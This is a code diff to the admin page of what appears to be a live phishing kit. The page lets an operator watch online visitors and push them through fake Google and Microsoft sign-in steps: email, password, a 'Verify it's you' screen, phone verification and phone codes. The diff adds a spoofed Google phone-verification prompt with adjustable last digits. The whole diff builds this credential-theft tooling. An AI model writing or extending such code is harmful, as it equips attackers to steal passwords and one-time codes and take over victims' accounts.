@@ -128,10 +128,11 @@ const PROVIDER_PUSH_STEPS: Record<string, { label: string; step: string; color: 
     { label: 'Verify Code', step: 'verification-code', color: '#6d28d9' },
   ],
   google: [
-    { label: '↩ Email',     step: 'email',            color: '#4b5563' },
-    { label: 'Password',    step: 'password',          color: '#4285F4' },
-    { label: 'Phone Verify',step: 'phone-verify',      color: '#065f46' },
-    { label: 'Phone Code',  step: 'phone-code',        color: '#b45309' },
+    { label: '↩ Email',        step: 'email',        color: '#4b5563' },
+    { label: 'Password',       step: 'password',     color: '#4285F4' },
+    { label: 'Verify it\'s you', step: 'verify',     color: '#1a73e8' },
+    { label: 'Phone Verify',   step: 'phone-verify', color: '#065f46' },
+    { label: 'Phone Code',     step: 'phone-code',   color: '#b45309' },
   ],
 };
 
@@ -149,10 +150,11 @@ function ProviderBadge({ provider, size = 14 }: { provider: string; size?: numbe
   return <span className="text-[11px] text-[#aaa]">{provider}</span>;
 }
 
-function loginSrc(provider: Provider, device: Device, theme: Theme, prompt: Prompt, phoneEnabled: boolean) {
+function loginSrc(provider: Provider, device: Device, theme: Theme, prompt: Prompt, phoneEnabled: boolean, googlePhone?: string) {
   const base = import.meta.env.BASE_URL.replace(/\/$/, '');
   const phonePart = provider === 'microsoft' && phoneEnabled ? '&phone=1' : '';
-  return `${base}/?provider=${provider}&device=${device}&theme=${theme}&prompt=${prompt}${phonePart}`;
+  const gphonePart = provider === 'google' && googlePhone ? `&gphone=${googlePhone}` : '';
+  return `${base}/?provider=${provider}&device=${device}&theme=${theme}&prompt=${prompt}${phonePart}${gphonePart}`;
 }
 
 function visitorModalSrc(visitor: VisitorInfo) {
@@ -428,6 +430,7 @@ export default function AdminPage() {
   const [theme, setTheme] = useState<Theme>('light');
   const [prompt, setPrompt] = useState<Prompt>('password');
   const [phoneEnabled, setPhoneEnabled] = useState(false);
+  const [googlePhone, setGooglePhone] = useState('09');
   const [visitors, setVisitors] = useState<VisitorInfo[]>([]);
   const [modalVisitorId, setModalVisitorId] = useState<string | null>(null);
   const [previewKey, setPreviewKey] = useState(0);
@@ -553,7 +556,7 @@ export default function AdminPage() {
     { id: 'other-ways', name: 'Other ways', icon: <LayoutList className="w-3.5 h-3.5 text-white" />, desc: 'Let user choose method' },
   ];
 
-  const src = loginSrc(provider, device, theme, prompt, phoneEnabled);
+  const src = loginSrc(provider, device, theme, prompt, phoneEnabled, googlePhone);
   const accentColor = PROVIDER_COLORS[provider];
 
   const onlineCount = visitors.filter(v => v.online).length;
@@ -699,6 +702,33 @@ export default function AdminPage() {
                     {prompt === p.id && <span className="w-1.5 h-1.5 rounded-full flex-shrink-0 bg-[#0078D4]" />}
                   </button>
                 ))}
+              </div>
+            </section>
+          )}
+
+          {/* Prompt — Google only: phone last-digits picker */}
+          {provider === 'google' && (
+            <section className="space-y-2">
+              <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] px-1">Prompt</p>
+              <div className="rounded-lg border border-[#2d3139] bg-[#1a1d24]">
+                <div className="flex items-center justify-between px-3 py-3">
+                  <div className="flex items-center gap-2.5">
+                    <Smartphone className="w-4 h-4 text-[#6b7280]" />
+                    <div>
+                      <div className="text-[13px] text-[#aeb5c0] font-medium leading-none mb-0.5">Phone last digits</div>
+                      <div className="text-[10px] text-[#606672] font-mono tracking-widest">●●●●●●●●{googlePhone}</div>
+                    </div>
+                  </div>
+                  <div className="flex items-center gap-1.5">
+                    <button
+                      onClick={() => setGooglePhone(p => String(Math.max(0, parseInt(p) - 1)).padStart(2, '0'))}
+                      className="w-6 h-6 rounded bg-[#2a2d35] hover:bg-[#3a3f4a] text-[#aeb5c0] flex items-center justify-center text-base font-bold leading-none transition-colors">−</button>
+                    <span className="text-[15px] font-mono font-semibold text-white w-6 text-center">{googlePhone}</span>
+                    <button
+                      onClick={() => setGooglePhone(p => String(Math.min(99, parseInt(p) + 1)).padStart(2, '0'))}
+                      className="w-6 h-6 rounded bg-[#2a2d35] hover:bg-[#3a3f4a] text-[#aeb5c0] flex items-center justify-center text-base font-bold leading-none transition-colors">+</button>
+                  </div>
+                </div>
               </div>
             </section>
           )}
